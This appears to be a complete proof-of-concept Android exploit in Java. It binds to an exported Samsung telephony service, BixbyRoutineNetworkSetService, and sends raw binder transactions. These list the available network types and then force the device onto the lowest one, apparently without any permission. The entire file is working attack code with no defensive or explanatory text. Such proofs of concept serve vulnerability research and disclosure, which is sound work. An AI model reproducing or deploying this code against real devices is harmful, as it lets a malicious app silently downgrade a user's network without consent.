package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;

public class MainActivity extends Activity {
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.samsung.android.app.telephonyui", "com.samsung.android.app.telephonyui.netsettings.ui.preference.service.BixbyRoutineNetworkSetService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder(IBinder binder) {
        try {
            // listing available network types
            Parcel parcel1 = Parcel.obtain();
            parcel1.writeInterfaceToken(binder.getInterfaceDescriptor());

            Parcel reply = Parcel.obtain();

            binder.transact(2, parcel1, reply, 0);
            reply.readException();

            // setting the lowest network type
            int[] types = reply.createIntArray();
            int lowestNetwork = types[types.length - 1];
            Parcel parcel2 = Parcel.obtain();
            parcel2.writeInterfaceToken(binder.getInterfaceDescriptor());
            parcel2.writeInt(lowestNetwork);

            reply = Parcel.obtain();

            binder.transact(3, parcel2, reply, 0);
            reply.readException();
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}